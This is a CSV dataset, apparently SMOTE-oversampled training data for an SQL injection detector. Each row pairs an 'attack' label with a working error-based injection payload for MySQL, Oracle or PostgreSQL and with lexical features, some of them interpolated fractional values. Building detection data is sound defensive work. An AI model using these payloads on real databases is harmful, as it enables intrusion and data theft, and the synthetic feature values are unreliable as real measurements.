id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000024,attack,error,"-6798%""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000308,0.681250968969416,381.1086945800334,34.0,3.261925677562444,78.72946907554072,48.0,185.6763273111482,68.70289819334447,0.20683305220581483,0.12599725864438513,0.48695802430790697,0.18021166484189308,0.0,4.0,1.0,0.0,0.0,3.0,0.0,37.13526546222964,1.567632731114821,0.0,0.0,24.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000025,attack,error,"1""  )   where 5196  =  5196 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000264,0.16215729381636013,354.31331778742526,34.931331778742525,3.5535407535296595,86.54934577005977,56.725327114970106,151.17598134491033,59.86266355748506,0.24432800505125657,0.16008680965038702,0.4266327746377181,0.16895241066063832,0.0,1.0,2.0,0.0,0.0,3.0,0.0,30.79399533622758,0.0,0.2060046637724176,0.9313317787425275,25.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000026,attack,error,"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000018,1.3697123565616416,192.3436733450642,27.95533524144691,3.460217885215034,41.77667620723455,35.65632665493581,84.91067048289382,30.0,0.216798290935103,0.1857694222364044,0.44140999442896567,0.1560222923995269,4.0,0.0,0.0,0.0,0.47766762072345514,2.0,0.0,16.0,2.0,0.0,5.04466475855309,2.477667620723455,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.9553352414469103,0.0,0.0,0.47766762072345514,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,5.433002862170365
SMOTE_000027,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000240,1.1556985724151831,162.0,30.361884836698778,3.8651604557444568,40.914345489903674,44.44753934679511,56.276230326602445,20.361884836698778,0.2525576882092819,0.27436752683206855,0.3473841378185336,0.1256906471401159,0.6381151633012231,0.3618848366987768,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.361884836698777,4.0,0.6381151633012232,0.36188483669877686,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000028,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000237,1.5328517691944952,223.21213800136874,31.0,3.783478604800965,72.78786199863126,37.0,86.3182070020531,27.10606900068437,0.32651835840916565,0.1658147948011457,0.38635198626798084,0.12131486052170776,4.0,0.0,0.0,0.0,0.0,2.0,0.0,15.053034500342184,1.0530345003421842,0.0,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.0
SMOTE_000029,attack,error,"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000068,1.9935928172118875,281.6152321539124,36.0,3.8880107389723957,100.48662538795843,39.106996896332596,108.94136219737196,33.08024767224945,0.35937386401657634,0.13863055989732348,0.3846168666967822,0.11737870938931794,0.0,0.0,0.0,0.0,2.0,1.5133746120415748,0.0,21.08024767224945,0.0,2.0,5.0,3.5133746120415745,0.0,0.0,0.0,0.48662538795842525,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.5133746120415748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.513374612041575
SMOTE_000030,attack,error,"-5667%'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000281,0.25942047142191205,364.1679409031797,36.0,3.485357213496815,83.0,52.0,163.13995075264978,66.02799015052994,0.22810545934257215,0.1429094444073946,0.44766105066978773,0.1813240455802456,4.0,0.0,1.0,0.0,0.0,3.0,0.0,33.02799015052995,2.0,0.0,1.0,24.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000031,attack,error,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000072,0.5486599962655191,277.2932295518973,36.14135408962054,3.9442425265100463,100.98947862734379,35.0,103.86916728303568,37.43458364151784,0.36426795403077766,0.12622522156802374,0.37453342031958653,0.13497340408161201,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.71729182075892,1.7172918207589194,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.8586459103794595,0.14135408962054014,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000032,attack,error,-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,nearest_attack_euclidean,R000124,1.2510863277174644,374.0599906035247,32.348461177058645,3.26093796637359,81.41653647382253,48.0,179.90114824440894,64.7423058852932,0.21768377400029432,0.12889663785491262,0.4804257350028609,0.17299385314193216,2.6969223541172838,0.0,1.0,0.0,0.0,2.674230588529321,0.0,36.3711529426466,0.0,0.0,0.0,23.67423058852932,0.674230588529321,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.674230588529321,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.674230588529321
SMOTE_000033,attack,error,"1   )    )    as atiy where 3855  =  3855 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000130,0.07456467345766804,368.70099097194077,32.94019819438815,3.526063097104929,91.76079277755261,56.9202642591842,160.0398678704079,59.98006606479605,0.24885735891398622,0.15437677817768553,0.4340832046351415,0.1626826582731868,0.0,0.0,2.0,0.0,0.0,3.0,0.0,32.0,0.0,0.0,0.9800660647960511,25.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.9800660647960512,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.019933935203948885,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000034,attack,error,"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000299,1.248987802278423,175.23180880840474,36.830907841120634,3.9853645199881136,59.15453920560316,31.0,64.41545392056031,20.66181568224126,0.33700050299989304,0.17721938278040433,0.368130175869462,0.11764993835024065,1.2463617616809468,0.0,0.0,0.0,0.0,1.0,0.0,13.0,0.0,0.0,4.0,1.4154539205603154,0.41545392056031566,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.4154539205603156,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,3.4154539205603154
SMOTE_000035,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000054,0.4637126343013605,189.25733022816874,33.15237054287952,3.7213842762457,47.84762945712048,40.45711162863854,76.56207131392776,24.39051782848194,0.25306492471309366,0.2142442595657283,0.40393284854671935,0.12875796717445864,0.0,1.0,2.0,0.0,0.8476294571204854,2.0,0.0,13.542888371361457,0.0,0.0,4.152370542879515,4.847629457120485,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.695258914240971,0.0,1.0,0.8476294571204853,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.542888371361456
SMOTE_000036,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000078,0.12680921044430346,171.09128529787182,30.0,3.79399668996109,48.365141191487275,35.0,64.81742940425636,22.908714702128183,0.2826756918756452,0.20456973393766104,0.378853763217944,0.13390081096874973,0.0,4.0,0.0,0.0,0.0,1.9087147021281814,0.0,12.0,0.0,0.0,5.0,1.9087147021281812,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000037,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000052,1.4137292832195782,361.392678640423,36.41633806356744,3.5912741627578053,96.99605676280927,50.49802838140464,152.90253673339987,60.99605676280927,0.2694024135799927,0.14028894453878607,0.4214855077794431,0.16882313410177813,0.0,0.0,1.0,0.0,0.0,2.0,0.0,32.16338063567439,0.0,1.750985809297683,0.0,25.49802838140463,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.416338063567439,0.0,0.0,1.416338063567439,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.832676127134878
SMOTE_000038,attack,error,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000291,0.079940322954405,133.0,29.667454717211683,3.759063149608426,56.0,14.0,51.00000000000001,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0000000000000002,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.0
SMOTE_000039,attack,error,"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000234,0.5011234128994037,424.72774147335343,35.478595839019015,3.5221334094511705,106.21404160980984,61.52140416098098,186.62457281716723,70.36772288539541,0.24985022491160053,0.14543974067981436,0.4390127666530905,0.1656972677554946,0.0,1.0,3.0,0.0,0.0,3.0,0.0,38.085616643923935,0.0,0.0,0.23929791950950818,30.564212482942953,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.760702080490492,0.0,1.0,1.7607020804904918,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.521404160980984
SMOTE_000040,attack,error,"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000185,1.0516678272257256,190.7249069088752,37.6986891100592,4.062842540798507,67.1091762295856,31.3013108899408,67.41048711952641,24.903932669822403,0.3518303829728789,0.1643420879826157,0.35330739713925535,0.1305201319052501,3.3013108899408,0.0,0.0,0.0,0.0,1.0,0.0,13.301310889940801,0.0,0.0,4.0,3.602621779881601,1.0,0.0,0.0,0.6986891100591996,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.30131088994080035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.3013108899408
SMOTE_000041,attack,error,"1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000213,1.3175956148076668,288.6242641472364,38.82803301840455,4.0395598554383865,111.0,39.87475471574545,102.92147641308637,34.82803301840455,0.38522885758654735,0.13782679599962014,0.35628250922449184,0.12066183718934069,2.7813113210636367,0.0,0.0,0.0,2.0,1.6093443394681815,0.0,19.218688678936363,0.0,2.0,5.0,4.828033018404544,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.6093443394681817,0.0,0.6093443394681816,2.0,0.39065566053181844,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.609344339468182
SMOTE_000042,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000155,0.4417806341858654,184.03360373215497,31.706192869048515,3.890328971048632,48.853096434524254,45.237157214291095,64.67786791071832,25.26548217262129,0.26614693890626956,0.24520966634318234,0.3515006383273694,0.13714275642317872,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.706192869048516,0.0,0.0,5.853096434524257,3.7061928690485164,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.853096434524258,0.0,0.853096434524258,0.0,1.146903565475742,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.853096434524258
SMOTE_000043,attack,error,1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',nearest_attack_euclidean,R000087,0.8292651056045235,363.64776857765406,30.282388428882705,3.2640425683821395,80.25910743106162,45.0,173.38866114659243,65.0,0.22059822730087084,0.12382024189357074,0.4767300702926229,0.17885146051293552,4.0,0.0,0.0,0.0,0.0,3.0,0.0,34.56477685776541,1.4352231422345936,0.0,0.0,23.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000044,attack,error,"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000113,0.20170410208014683,203.70227947317622,40.0,3.895015233333359,63.0,37.0,81.25189956098018,22.450379912196034,0.309456389255364,0.18174422861029313,0.39862078652222677,0.1101785956121161,0.0,1.0,1.0,0.0,1.0,1.0,0.0,14.450379912196038,0.0,0.0,3.0,3.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000045,attack,error,1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000189,0.817932539254359,417.88328858794046,34.0,3.3580038651153634,96.02449664351191,50.20244966435119,197.04286912614583,74.61347315393155,0.2293627335452388,0.12073461319495314,0.471240740733046,0.17866191252676208,4.0,0.0,0.0,0.0,0.0,3.0,0.0,40.80979865740476,2.0,0.0,0.3987751678244047,26.60734899305357,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.6012248321755953,0.0,0.0,1.6012248321755953,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.202449664351191
SMOTE_000046,attack,error,-1549'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'fnwx'  =  'fnwx,nearest_attack_euclidean,R000148,0.8149651069505723,435.78730749037015,34.445177499259245,3.5107759981752356,113.89365374518508,55.11294374814811,192.1129437481481,74.66776624888887,0.2612090982201066,0.12642824973084302,0.44098934149858726,0.17137331055046318,4.0,0.0,0.7774112503703781,0.0,0.0,3.0,0.0,40.0,0.0,0.0,0.0,30.667766248888867,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.222588749629622,0.0,0.22258874962962205,2.222588749629622,1.0,0.7774112503703781,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.445177499259245
SMOTE_000047,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",nearest_attack_euclidean,R000205,0.8922534788629827,181.2151305909652,29.44860522363861,3.645867658299436,48.79442089455443,35.0,73.07489402549494,24.345815670915826,0.2697719581990615,0.1940413402508663,0.4017722019885792,0.13441449956149293,0.0,4.0,0.0,0.0,0.0,1.5513947763613922,0.0,13.794420894554431,0.0,0.0,5.0,1.5513947763613913,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
